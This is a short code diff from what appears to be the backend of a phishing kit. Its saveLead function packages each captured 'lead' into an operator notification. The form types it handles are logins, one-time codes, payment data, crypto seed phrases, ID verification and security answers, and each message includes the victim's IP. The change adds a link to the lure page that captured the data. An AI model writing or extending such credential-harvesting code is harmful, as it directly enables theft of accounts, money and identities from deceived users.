@@ -157,9 +157,11 @@ async function saveLead(page, tpl, stepSlug, body, req) {
     const emoji = { login:'🔐', otp:'🔢', payment:'💳', seed_phrase:'🌱', id_verify:'🪪', security_q:'❓' }[pageContent?.form_type] || '📋';
     const ts = new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo', hour12: false });
     const ipStr = ip ? `\n🌐 IP: <code>${esc(ip)}</code>` : '';
+    const base = process.env.BASE_URL || '';
+    const pageUrl = base ? `\n🔗 <a href="${base}/p/${esc(page.slug)}">${base}/p/${esc(page.slug)}</a>` : '';
     const msg = `${emoji} <b>${esc(pageContent?.step_label || stepSlug)}</b>
 📄 <b>${esc(tpl.name)}</b> · <code>${esc(page.slug)}</code>
-🕐 ${ts}${ipStr}
+🕐 ${ts}${ipStr}${pageUrl}
 
 ${lines}`;
     await notify(msg).catch(() => {});
